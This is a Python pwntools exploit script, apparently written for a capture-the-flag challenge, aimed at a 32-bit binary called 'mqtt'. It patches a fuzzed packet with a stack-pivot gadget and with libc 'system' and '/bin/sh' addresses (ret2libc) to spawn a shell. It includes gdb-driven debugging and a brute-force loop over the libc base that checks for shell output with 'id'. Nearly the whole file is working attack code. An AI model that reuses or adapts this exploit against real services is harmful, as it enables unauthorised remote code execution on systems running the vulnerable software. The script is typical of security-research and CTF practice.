#!/usr/bin/env python3

from pwn import *
#import IPython
from multiprocessing import *

context.log_level = 'debug'
#context.terminal = ['tmux','splitw','-h']

with open("pkts-fuzzed-6045", 'rb') as fd:
    data = fd.read()

libc_base = 0xf7000000  # 0xf7x??000    brute force 1 byte
add_esp_17c = 0x00061a40
libc_system = 0x3a850
libc_binsh = 0x15d7c8
guess_off = 0x6c000

data = data[:11] + p32(libc_base+add_esp_17c+guess_off+0x500000) + data[11+4:]
#data = data[:11] + p32(0xf755abcd)+ data[11+4:]
libc_base = 0xf7e14000
guess_off = 0
data = data[:0x1c] + p32(libc_base+guess_off+libc_system) + b'BBBB' + p32(libc_base + guess_off+libc_binsh) + data[0x28:]


p = process(["gdb", "./mqtt_noalarm"])
p.recvuntil('(gdb)')
#p.sendline('b *0x5657ce7e')
#p.recvuntil('(gdb)')
#p.sendline('b *0x5657cf7f')
#p.recvuntil('(gdb)')
p.sendline('b *0x56576077')
p.recvuntil('(gdb)')
p.sendline('r')
sleep(1)
p.recvuntil('Starting program:')
p.send(data)
p.recvuntil('(gdb)')
p.sendline('set $eax=0xf7e75a40')
#p.sendline('c')
p.interactive()

def pwn(i):
    global data
    p = process("./mqtt")
    sleep(1)
    #p = remote("localhost", 10000)
    p.send(data)
    sleep(1)
    try:
        #p.recvuntil('$')
        if not p.poll():
            p.sendline('id')
            sleep(1)
            ret = (p.recvline(), p.poll(), hex(p.libs()['/lib32/libc-2.24.so']))
        else:
            ret = ("err", p.poll(), hex(p.libs()['/lib32/libc-2.24.so']))
    except:
        ret = ("", p.poll(), hex(p.libs()['/lib32/libc-2.24.so']))
    p.close()
    return ret

#for i in range(256):
#    print(pwn(i))
